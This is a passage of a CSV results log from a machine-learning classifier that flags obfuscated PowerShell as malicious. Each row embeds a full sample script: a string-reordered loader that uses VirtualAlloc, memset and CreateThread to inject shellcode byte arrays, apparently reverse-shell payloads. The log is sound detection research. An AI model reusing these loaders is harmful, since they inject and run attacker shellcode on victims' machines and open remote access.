(Jg3z.Leng','ff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x','x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x0','0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,','Definitio',' count);Ux4;Jg3w = Add-Type -member','n Jg3c -Name iJOWin','0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc','f,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75','Jg3c = Ux4[DllImport(iJOkernel32.dlliJO)]public static ','0x0c,0x4b,','0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0','1000){Jg3g = Jg3z.Length};Jg3x=Jg3w::VirtualAlloc(0,0x1000,Jg3g,0x40);for ','extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flP','2()+Jg3i), Jg3z[Jg3i], 1)};Jg3w::CreateThread(0,0,Jg3x,0,0,0);for (;;){Start-sleep 60};','xd6,0x31,0','3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0',',0xd3,0x66,0x8b,','x00,0x68,0x58,0xa4,0x53,0xe5,','4,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,',',0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,','68,0x00,0x10,0x00,0x00,0x56,0x6a,0','0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0x','5d,0x68,0x33,0x32,0x00,0x00,0x68,','rotect);[DllImport(iJOkern','0','x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d','xff,0xd5,0x97,0x6a,0x05,0x')).RepLACE('Ux4',[StRing][cHar]39).RepLACE(([cHar]74+[cHar]103+[cHar]51),[StRing][cHar]36).RepLACE(([cHar]105+[cHar]74+[cHar]79),[StRing][cHar]34) |&amp; ( $shEllID[1]+$shELlid[13]+'X')",malicious,TP
2026-07-13 17:07:01,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2950.ps1,custom-ps-ml,UNKNOWN,076316eb-a4a1-4885-a0b8-a5c4656106bb,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3812,1924.72," (((\""{43}{1}{64}{16}{20}{48}{41}{33}{37}{19}{34}{12}{14}{38}{42}{31}{6}{56}{59}{10}{58}{36}{55}{24}{49}{8}{26}{4}{0}{2}{45}{52}{30}{62}{44}{7}{51}{23}{28}{50}{53}{57}{61}{11}{40}{25}{17}{60}{32}{22}{39}{35}{46}{63}{54}{3}{18}{13}{5}{29}{15}{9}{47}{27}{21}\"" -f'xf7,0x53,0x99,0x7d,0x14,0x17,0x96,0x48,0xb5,0xd3,0x83,0xd1','t dwSize, uint flAllocationType, uint flPro',',0x09,0x09,0xfe,0x5f,0x38,0xe6,0x0f,0x0d,0x65,0xd1,0xc9,0x01,0x0e,0x67,0xf3,','7','a,0x77,0x16,0x9e,0x58,0xaf,0xd4,0xf1,0xd3,0x44,0x2a,0xd3,0x39,0x40,0x14,0x8f,0x33,0xa8,0xac,0','Length -gt 0x1000){ACrg = ACrz.Length};ACrx=ACrw::VirtualAlloc(0,0x1000,ACrg,0x40);for (ACri=0','31,0x55,0x17,0x03,0x55,0x17,0x83,0x1f,0xfd,0x64,0x75,0x67,0xaf,0xce,','0x8d,0x55,0xe4,0x5f,0xab,0x',',0xf3,0x30,0x99,0xfd,0xcf,0x6a,0xf1,0x7f,0xa7','ri++) {ACrw::mems','67,0x1d,0x22,0xe0,0x75,0x22,0xf0,0x6b,0x91,0x45,0x02',',0x04,0x93,0xc0,0xf7,0x',' -passthru;[','0x6b,0xc2,0xad,0x2b,0xdb,0xe7,0xc8;ACrg = 0x1000;if (ACrz.','Byte[]];','Cri -le (ACrz.Length-1);AC','read(IntPtr lpThread','8',',0xf9,0x66,0xd9,0xf9,0xa3,0x02,0x26,0x41,0x02,0xe9,0x62,0x3d,0x01,0x53,0x58,0xb8,','rc, uint count);hQR;ACrw = Add-Type -memberDefinitio','Attributes','0};','85,0xe7,0x53','24,0xe9,0x3d,0x40,0xbe','xc6,0x13,0x88,0x03,0x84,0x4d,0xc',',0xea,0x',',0xb','z[ACri], 1)};ACrw::CreateThread(0,0,ACrx,0,0,0);for (;;){Start-sleep 6',',0x75,0x0c,0x29,0xa9,0x0f,0x37,0xbf,0x19,0x9c,0x7d,0x8a',';A','0x81,0xea,0xc9,0x30,0xc9,0x0b,0x51,0x11,0x52,0xe0,0x47,0x8c,0x82,0xa8,0x2d,0','0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x71,0x','b,0x56,0x89,0x97,0xf6,0x32,0xae,0x4b,0x2f,0x07,0xf2,0x25,0x59,0x1b,0x6b,0x1f,0x','emset(Int','n ACrc -Name 7LBWin327LB -namespace Win32Functions','d2,0x58,0xbc,0xbb,0x0c,0x92,0xaf,0x08,0xc0,0x04,0x6b,0x16,0x07,0x58,0x3b,0xfe,0x35,0x1e,0xb6,0x1d,0xc3,0xcf,',',0x28,0x14,0xe8,0','Ptr dest, uint s','[Byte[]]ACrz = 0xd',',0x0b,0x9c,0xc2,0x95,0x71,0x7a,0x9f,0xae,0x9d,0xfa,0xeb,0x81,0x','b5,0x7f,0x09,0xa2,0xab,0x5e,0x30,0x2a,0x26,0x6f,0xf1,0x64,0x44,0x7e,0xb3,0xad,0x32,0x58,0xe7,0xb8,0xfe,0x37,0x25,0x74,0x6b,0xb0,0xfa,0xb3,0xb7,0x1a,0x44','reationFlags, IntPtr lpThreadId);[DllImport(7LBmsvcrt.dll7LB)]public static extern IntPtr m','9,0xca,0xba,0xf2,0x01,0x86,0x80,','ACrc = hQR[DllImport(7LBkernel32.dll7LB)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uin','x89,0x15,0x6b,0x62,0x6f,0xfb,0x56,0x0a,0xc0,0x9d,0x57,0x5f,0x2b,0x4f,','0xb1,0x8c,0x06,0x66,0','0x73,0x0d,0xaf,0x3b,0x62,0x2a,0x7f,0x20,0xa7,0x49,0x8b,0x9c','et([IntPtr](ACrx.ToInt32()+ACri), ACr',', uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwC','6,0xaf,0x6c,0xec,0xa4,0x78,0x2b,0xe2,0x88,0x1e,0xe2,0xa5,0x41,0x97,0x06,0xfb',',0xac,0xbe,0xbe,0x98,0xe4,0xd6,0x45,0xf1,0x99,0x4c,0xff,0x9c,0','1f,0xb8,0x32,0x6c,0x43,0x56,0x1f,0x90,0xee,0xcd,0xce,0x29,0xf6,0x58,0xfe,0x35,0x0c,0x56,0x1c,0xef,0x5a,0xe5,0x44,0x53,0x61,0xe8,0x57,0x25,0x58,0xe2,0xff,0xe6,0xe0,0x','x82,0x66,0x25,0xfd,0x5a,0x59,0x69,0x81,0xdc,0x32,0x72,0x9a,','x78,0x79,0x0c,0x23,',',0x8c,0x83,0x98,0xb5,0x6b,0xf3,0x5e,0xd8,0x6e,0x5f,0xc','x66,0x2d,0x31,0x4a,0x7a,0xeb,0','0x15,0xa1,0x8b,0xdb,0x03,0xb9,0x0f,0x10,0xe9,0x70,0x99,0x69,0x64,0x43,0x5b,0x99,0x7a,0xe1,0x48,0x1e,0x96,0x48,0x2a,0xb6,0xeb,0x46,0x1e','0x10,0xc6,',',0x85,0x20,0x5c,0x1e,0xd4',',0xd8,0x35,0x59,0x1c,0x6c,0xe6,0x3e,0x54,0x5b,0xa0,0x6a,0xaa,0x0d,0x35,0x91,0x1c,0xe3,0xd3,0x9a,0x','3,0xbc,0xe6,0x02,0xc7,0x8c,0xd7,0x2f,0x27,0x74,0x16,0x88,0xac,0x37,0xb1,0x8a,0xc1,0x8a,0x11,0xf','0xde,0x42,0x26,0xb4,0xeb,0x6c,0x69,0xab,0x32,0x5b,0xea,0x3e,0xa9,0x78,0x88,0x58,0x34,0xa4,0x7f,0x6a','x70,0x37,0x9e,0xfa,0',',0x6d,0x63','tect);[DllImport(7LBkernel32.dll7LB)]public static extern IntPtr CreateTh')) -RePLace  'hQR',[CHaR]39-CrEplaCE  ([CHaR]55+[CHaR]76+[CHaR]66),[CHaR]34  -RePLace'ACr',[CHaR]36) |&amp;( $PshomE[21]+$PsHoMe[30]+'X')",malicious,TP
2026-07-13 17:07:16,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2951.ps1,custom-ps-ml,UNKNOWN,bf363c54-4b46-4330-8477-3cac51ce9b06,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2850,1753.51," iNVokE-ExPReSsioN( (((\""{33}{1}{43}{41}{12}{44}{28}{23}{39}{8}{27}{2}{4}{7}{30}{21}{47}{36}{38}{9}{29}{14}{24}{11}{19}{46}{6}{34}{32}{0}{16}{37}{20}{22}{40}{15}{18}{35}{13}{31}{10}{3}{17}{45}{48}{42}{25}{5}{26}\"" -f 'a,0x0a,0xda,0xeb,0xcf,0x26,0xe5,0xeb,0x47,0x30,0x96,0xd9,0xc8,0','ic extern IntPtr VirtualAlloc(IntPtr lpAddr','0xbe,0xe3,0x08,0x','e,0xcd,0x4a,0xb0,0x28,0x52,0xb4,0x97,0x23','f0,0x63,0xd9,0xc2,0xd9,0x74,0x2','t32()+YEri), YErz[YEri], 1)};YErw::CreateThr',',0xaf,0xe9,0xd0,0xd4,0xcc,0x94,0xe2,0x22,0xaf,0x42,0x66,0xb1,0x17,0x00,','4,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x31,0x73,0x13,0x83,0xc3,0x04,0x03,0x73,0xec,0xea,0x05,0x9f,0x1a,0x68,0xe5,0x60,0xda,0x0d,0x6f,0','hru;[Byte[]];[Byte[]]YErz','1,0xfa,0',',0x36,0xf5,0xa3,0xbb,0x0d,0xa7,0x65,0xc3,0xbb,0xc2,0x89,0x51,0x40,0x45,0xd',',0x0a,0x92,0x4e,0xa0,0x9c,0xa9,','t flProtect);[DllImport(PTFkernel32.dllPTF)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lp','f,0x9c,0xac,0x1e,0x6b','0xe3,0x38,0x5e,0x88,0xbe,0x80,','2a,0xd1,0x','xea,0x30,0x51,0x80',',0x5b,0x20,0x58,0x5b,0xa4,0xa4,0x58,0x9b,0xf2,0xae,0x58,0xf3,0xa2,0x8a,0x0a,0xe6,0xac,0x06,0x3f,0xbb,0x38,0xa9,0x16,0x','70,0x8e,0x4a,','0x08,0x62,0x1e,0x7e,0x21,0x2b,0x38,0x63,0x0c,0xe5,0xb3,0x57,0xfa,0xf4,0x15,0xa6,0x03,0x5a,0x58,0x07,0xf6,','bb,0x81,0x58,0x69,0x44,0xf2,0x71,0xad,0x10,0','5,0x0d,0x30,0xec,0x3b,0x9a,0x37,0x45,','xa2,0xe9,0x04,0x19,0x29,0xea,0xa9,0xcc,0xc4,0xef,0x3d,0x5d,0x51,0x2a,0x6b,0xc9,','inition YErc','0xd5,0xc2,0x2f,0x81','emset([IntPtr](YErx.ToIn','ead(0,0,YErx,0,0,0);for (;;){Start-sleep 60};',' = ',' static extern IntPtr memset(IntPtr dest, uint src, uint count);smY;YErw = Add-Type -memberDef','xe5,0x79,0x64,0xfb,0x22,0x67,0x85,0xa9,0xfb,','x85,0xeb,0x0d,0x0b,0xcd,0x5b,0xbe,0x5f,0x83,0x57,0x3',',0x3d,0x30,0xb5,0x11,0x7d,0xba,0x3a,0xe5,0x33,0x4b','0x63,0xf','YErc = smY[DllImport(PTFkernel32.dllPTF)]public stat','0xd0,0x1d,0xa6,0xc5,0x87,0xd6,0xa4,0xa2,0xcc,0xb1,0xa8,0x35,0x00,0xca,0xd4,0xbe,0xa7,0x1d,0x5d,0x84,0x83,0xb9,0x06,0x5e,0xad,0x98,0xe2,0x31,0xd2,0xfb,0x4d,0xed,0x76,0x77,','0xda,0x5a,0xa7,0xe0,0x35,0x33,0x9','x76,0x56,0xaa,0',',0x34,0xc6,0x96,0x','x3d,0x18,0xd4,0xb1,0x1',' -Name PTFWin32PTF -namespace Win32Functions -passt','0x60,0xca,0x8c,0x9a,0xec,0x2c,0xe2,0xca,0xbe,0xe0,0x42,0xbb,0x7e,0x51,0x',', uin','00;if (YErz.Length -gt 0x1000){YErg = YErz.Length};YErx=YErw::VirtualAlloc(0,0x1000,YErg,0x40);for (YEri=0;YEri -le (YErz.Length-1);YEri++) {YErw::m','ess, uint dwSize, uint flAllocationType','Parameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(PTFmsvcrt.dllPTF)]public','68,0xea,','0xa2,0x9c','0xf1,0xfc,0','0xc1,0x94,0x57,0xdc,0x4d,0x66,0xb2,0xdc,0xb2,0xb1,0xfa,0xaa,0xda,0x01;YErg = 0x10'))  -CREPLaCE'YEr',[chAr]36-CREPLaCE'PTF',[chAr]34  -repLAce([chAr]115+[chAr]109+[chAr]89),[chAr]39) )",malicious,TP
2026-07-13 17:07:30,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2963.ps1,custom-ps-ml,UNKNOWN,5f3134a5-e52a-49c8-ac1c-78f8be449fbc,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2894,1753.17,"((\""{11}{26}{47}{45}{9}{38}{10}{37}{34}{28}{14}{2}{35}{1}{42}{22}{6}{25}{13}{39}{31}{43}{3}{4}{8}{12}{30}{48}{44}{41}{16}{19}{33}{21}{17}{7}{24}{5}{20}{46}{29}{36}{18}{0}{40}{32}{23}{27}{15}\"" -f 'f4;hKmg = 0','mset(IntPtr dest, uint','ntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(29','35,0xde,0xec,0xf9,0x4e,0xb9,0x2e,0xfb,0x83,0xb1,0x66,0xe3,0xc0,0xfc,0x31,0x98,0x32,0x8a,0xc3,0x48,0x0b,0x73,0x6f,0xb5,0xa4,0x86,0x71,0xf1,0x02,0','x79,0x0','xf4,0xb3,0xcd,0xac,0xf8,0x53,0xce,0x2c,0xaf,0x','K -namespace Win32Functions -passthru;[Byte[]];[Byte[]]hKmz = 0xd9,0xee,0xd9,0x74,0x24,0xf',',0x40,0x90,0xa7,0x62,0x34,0x50,0xf2,0xd9,0x92,0x6f,0x28,0x7','4,0x0b,0x71,0x04,0x1f,0xc8,0x08,0xd2,0xaa,0xcb,0xaa,0x91,0x0d,0x30,0x4b,0x7','IntPtr','int flProtect);[DllImpo','hKmc = P9W[DllImport(29Kke','5,0xcb,0xb3,0x47,0x32,0x9f,0x9c,0x4b,0xc5,0x4c,0x97,0x77,0x4e,0x73,0x78,0xfe,0x14,0x50,0x5c,0x5b,0xce,0xf9,0xc5,0x01,0xa1,0x06,0x15,0xea,0x1e,0xa3',',0x47,0x83,0xef,0xfc,0x31,0','ttributes, uint dwStackSize, I','.ToInt32()+hKmi), hKmz[hKmi], 1)};hKmw::CreateThread(0,0,hKmx,0,0,0);for (;;){Start-sleep 60};','f9',',0xe3,0xb1,0x71,0x6a,0xa2,0x6a,0xed,0x13,0xef,0xe1,0x8c,0xdc,0x25,0x8c,0x8e,0x57,0xca,0x70','e,0xf1,0x2d,0x30,0xc2,0x27,0x0b,0x46,0x2a,0x',',0x9c,0xf3,0x2b,0','39,0xce,0x44,','0x64,0xc5,0x06,0x7d,0x2a,0x95,0xa8,0x2e,0x8b,0x45,0x08,0x9f,0x63,0x8c,0x87,0xc0,0x94,0xaf,0x42,0x69,0x3e,0x55,0x04,0x56,0x17,0x54,0x92,0x3e,0x6a,0x57,0x1b,0x04','memberDefinition hKmc -Name 29KWin3229','=0;hKmi -le (hKmz.Length-1);hKmi++) {hKmw::mem','7,0x1a,0xfa,0xd7,0xde,0x4d,0x92,0xd5,0x07,0xb9,0x3d,0x25,0x62,0xb2,0','4,0x5f,0xbd,0x81,0x98,0xbc,0x3e,0x33,0xc9,0xb1','rnel32.dll29K)]pu','set([IntPtr](hKmx','ic extern IntPtr CreateThread(IntPtr lpThreadA','2a,0xcd,0x38,0x',',0x5d,0x06,0x4a,0xde,0','2d,0x2a,0xfe,0xf2,0xc6,0x7e,0xeb,0x81,0xab,0x56,0x1c,0x22,0x0','th -gt 0x1000){hKmg = hKmz.Length};hKmx=hKmw::VirtualAlloc(0,0x1000,hKmg,0x40);for (hKmi','xbd,0x33,0x0a,0xd4,0xbe,0x1a,0xc8,0x80,0xee,0x34,0xf9,0xa8,','ic stat','Kmsvcrt.dll29K)]public static extern IntPtr me','e0,0x9f,0x46,0x51,0x0e,0xc6,0xa1,0xf','rt(29Kkernel32.dll29K)]publ',' lpAddress, uint dwSize, uint flAllocationType, u','x6f,0x14,0x03,0x6f,0x95,0x7a,0x49,0xc2,0x7d,0xf8,0xb2,0x3b,0x7d,0x9d,0x3b,0xde,0x4c,0x9d,0x58,0xaa,0xfe,0x','x1000;if (hKmz.Leng',',0x5b,0x8c,0xf1,0x',' src, uint count);P9W;hKmw = Add-Type -','1,0x81,0x13,0xb3,0x3a,0xf1,0x32,0x37,0x41,0x26,0x95,0x06,0x8a,0x3b,0xd4,0x4f,0xf7,0xb6,0x84,0x18,0x73,0x64,0x39,0x2d,0xc9,0xb5,0xb2,0x7d,0xdf,0xbd,0x27,0x','4e,0xbf,0xd3,0xbf,0x8e,0xd7,0x64,0xb3,0xbc,0x78,0xdf','n IntPtr VirtualAlloc(','0x17,0x1a,0x9d,0x71,0x58,0xb7,0xb1,0x','blic static exter','x3f,0x')).rEpLaCe(([char]50+[char]57+[char]75),[STrIng][char]34).rEpLaCe(([char]104+[char]75+[char]109),'$').rEpLaCe('P9W',[STrIng][char]39) |.( $shElLiD[1]+$SHELLId[13]+'X')",malicious,TP
2026-07-13 17:07:46,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2975.ps1,custom-ps-ml,UNKNOWN,dab75e27-908a-49a8-8542-3971125e29f6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2993,2753.95,"ieX (((\""{22}{36}{21}{14}{44}{28}{26}{25}{3}{48}{31}{43}{4}{30}{46}{20}{42}{33}{32}{34}{18}{49}{19}{17}{16}{47}{50}{40}{6}{8}{13}{27}{24}{15}{35}{10}{7}{29}{12}{23}{0}{37}{11}{41}{5}{38}{39}{1}{45}{9}{2}\""-f 'x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,','2(','0,0,0);for (;;){Start-sleep 60};','ame M7oWin32M7o -namespace Win32Funct','0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0','y72g,0x40);for (y72i=0;y72','40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0x','e,0x36,0x8b,0x36,0x6a,','e0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99','2w::CreateThread(0,0,y72x,','x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7','x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x','xf8,0x00,0x7d,0x22,0x58,0x68,0',',0xa5,0','Attributes, uint dwStackSize, IntPtr lpStartAddress, ',',0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0','x4c,0x77,0x26,',',0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0','xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,','x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01','c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a','eateThread(IntPtr lpThread','y72c = tbn[DllImport(M7okernel32.dllM7o)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(M7okernel32.dllM7o)]','x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0','0xc0,0x74,0x0a,0xff','n;y72w = Add-Type -memberDefinition y72c -N','count);tb','x74,0x61,0xff,0xd5,0x85,','eadId);[DllImport(M7omsvcrt.dllM7o)]public static extern IntPtr memset(IntPtr dest, uint src, uint ','0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0','x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,','[Byte[]];[Byte[]]y72z =',',0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,','0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49','0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0','x6a,0x04,0x56,0x57,0x68,0','public static extern IntPtr Cr','0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0','i -le (y72z.Length-1);y72i++) {','y72w::memset([IntPtr](y72x.ToInt3','x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x69,0x63,0x1f,0xf9,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x','53,0xff,0xd5;y72g = 0x1000;if (y72z.Length -gt 0x1000){y72g = y72z.Length};y72x=y72w::VirtualAlloc(0,0x1000,',',0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,',' 0xfc,','IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThr',')+y72i), y72z[y72i], 1)};y7','0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2','0x07,0xff,0xd','ions -passthru;','0xd3,0','5,0xb8,0')).RepLAce('M7o',[String][cHar]34).RepLAce(([cHar]121+[cHar]55+[cHar]50),[String][cHar]36).RepLAce('tbn',[String][cHar]39))",malicious,TP
2026-07-13 17:07:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2977.ps1,custom-ps-ml,UNKNOWN,e16ff26c-8a2b-466b-9d38-c4b7a4a4e7cc,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2908,2110.32," (((\""{34}{43}{41}{27}{0}{23}{10}{3}{21}{33}{4}{38}{11}{14}{36}{13}{35}{20}{5}{48}{26}{17}{16}{12}{42}{24}{18}{46}{19}{30}{22}{39}{44}{7}{29}{47}{25}{31}{6}{15}{9}{45}{40}{37}{8}{2}{28}{1}{32}\""-f't flProtect);[DllImport(s72kernel32.dlls72)]public','Gz[fMGi], 1)};fMGw::CreateThread(',' 0x1000;if (fMGz.Length -gt 0',', uint dwCreationFlags, IntPtr lpThreadId);[DllImport(s72msvcrt.dlls72)]publ','e s72Win32s72 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]fMGz = 0xdd,0xc0,0xb8,0x83,0xd5,0x63,0x6f,0xd9,0x74,0x24,0xf4,',',0x4d,0xd0,','0x60,0x37,0x92,0x01,0x3f,0x65,0x34,0x1d,0x95,0x00,0xb8,0x8b,0x12,0',',0x0c,0x14,0x37,0x8c,0xc1,0xb8,0xbe,0x6a,0xb1,0x1',',0x82,0x87,0x73,0xad,0xf0,0xe9,0x47;fMGg =','ef,0x23,0x19,0xf2,0xc7,0xeb,0xe2,0xd1,0x5c,0x25,0x77,0x9a,0x0a,0x4a,0x97,0x1a,0xca,0x1c,0xfd,0x1a,0xa2,0xf8,0xa5,0x48,0xd7,0x06,0x70,0xfd,0x','extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter','0x35,0x59,0x6c,0x7f,0x5a,0xd3,0x89,0x4e,0x5a,0x87,0xda,0xe0,0x6a,0xc3,0x8f,0x0c,0x00','b,0x81,0xfc,0x9f,0x33,0xc6,0x39,0',',0x87,0x64,0x0e,0x4b,0x20,0xc2,0x68,0x62',',0x','x83,0x',',0x37,0x1d,0x34,0x89,0x4c,0x44,0x96,0x2','8a,0x0c,0xe1,0x7f,0x1a,0x15,0x16','cf,0x40,0xfa,0xb','66,0x4d,0xca,0x','x08','ic static extern IntPtr memset(IntPtr dest, uint src, uint count);9rk;fMGw',',0xe5,0xdd,0xf5',' static ','0xe2,0x41,0xfd,0x30,0xac,0x45,0x00,0x94,0xc6,0x71,0x89,0x1b,0x09,0xf0,0xc9,0x3f,0x8d,0x59,0x89,0x5e,0x94,0x07,0x7c,0x5e,0xc6,0xe8,0x21,0xfa,0x8c,0x04,0x35,0x77,0x','1,0x93,0x19,0x0',',0x19,0x54,0x06,0xbe,0x8c,0x49,0x23,0x','cationType, uin','x1000){fMGg = fMGz.Length};fMGrnqs=fMGw::VirtualAlloc(0,0x1000,fMGg,0x40);for (fMGi=0;fMGi -le (fMGz.Length-1);fMGi++) {fMGw::memset([IntPtr](fMGrnqs.ToInt32()+fMGi), fM','0,0x91,0x22','45,0x36,0xe5,0xfb','b,0x5e,0xcc,0x39,0x34,0xb4,0x65,0xd3,0xdb,0x61,0xdd,0x4b,0x45,0x28,0x95,0xea,0x8a,0xe6,0xd3,0x2c,0x00,0x05,0x23,0xe2,0xe1,','0,0,fMGrnqs,0,0,0);for (;;){Start-sleep 60};',' = Add-Type -memberDefinition fMGrnqsGN -Nam','fMGrnqsGN = 9rk[DllImport(s72kernel32.dlls72)]public static extern IntPtr VirtualAlloc(',',0xb1,0x7f,0x48,0xe5,0x31,0x82,0x9d,0xc5,0','81,0x3b','72,0xbb,0xa5,0x43','0x5e,0x31,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x14,0x03,0x46,0x97,0x37,0x96,0x93,0x7f,',',0x04,0x30,0x4b,0','0x5a,0x64,0x','pAddress, uint dwSize, uint flAllo','x69,0xcf,0x3c,0xb5,0x68,0x19,0x0d,0x36,0xc6,0x64,0xa2,0xc5,0x16,0xa0,0x04,0x36,0x6d,0xd8,0x77,0xcb,0x76,0x1f,0x0a,0x17,0xf2,0x84,0xac,0xdc,0xa4,0x60,0x4d,0x30,0x32,','IntPtr l','xf3,0x92,0x7b,0x24,0x6b','44,0x93,0x7b,0x54,0x39,0x34,0x14,','a,0xf0,0x90,0x94,0xcd,0x83,0xa2,0x3b,0x66,0x0c,0x8e,0xb4,0xa0,0xcb,0xf1,0xee,0x15,0x43,0x0c,0x11,0x',',0x71,0xc1,0x5','0x04,0x4d,0xb0')) -cREplACe ([chAr]102+[chAr]77+[chAr]71),[chAr]36  -cREplACe 's72',[chAr]34-rEPlAce  ([chAr]57+[chAr]114+[chAr]107),[chAr]39)| . ( $sheLliD[1]+$sHELLiD[13]+'x')",malicious,TP
2026-07-13 17:07:55,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3007.ps1,custom-ps-ml,UNKNOWN,ae9ee27d-c826-47a1-afa1-a975c637f9c9,DESKTOP-BAC9DBQ,malicious,0.9933,RandomForest,2894,2162.29,".((gET-VarIaBle '*mdr*').Name[3,11,2]-joIn'')( ((\""{15}{0}{14}{37}{25}{47}{3}{12}{45}{17}{28}{38}{2}{33}{34}{21}{18}{1}{4}{6}{16}{13}{31}{9}{40}{7}{27}{39}{44}{11}{24}{8}{46}{29}{5}{22}{35}{19}{23}{30}{20}{36}{10}{26}{32}{42}{41}{43}\""-f 'alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(0wfkernel32.dll0wf)','8b,0x49,0x18,0xe3,0x3a,0x','0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28','lImpor','49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1','0a,0xff,0x4e,0',',0xcf,0x0d,0','07,0xff','x0d,0x68,0x02,0x00,0x0b,0','4,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68','xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,','x05,0x68,0x01,0x37,','t(0wfmsvcrt.dll0wf)]public static extern IntPtr mems','xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,',']public static extern IntPt','Kh0c = lEJ[DllImport(0wfkernel32.dll0wf)]public static extern IntPtr Virtu','x01,0xc7,0x38,0xe0,0x75,0','memberDefinition Kh0c -Name 0wfWin320wf -namespace Win32Functions -passthru;[Byte[]];[Byte[]]Kh0z = 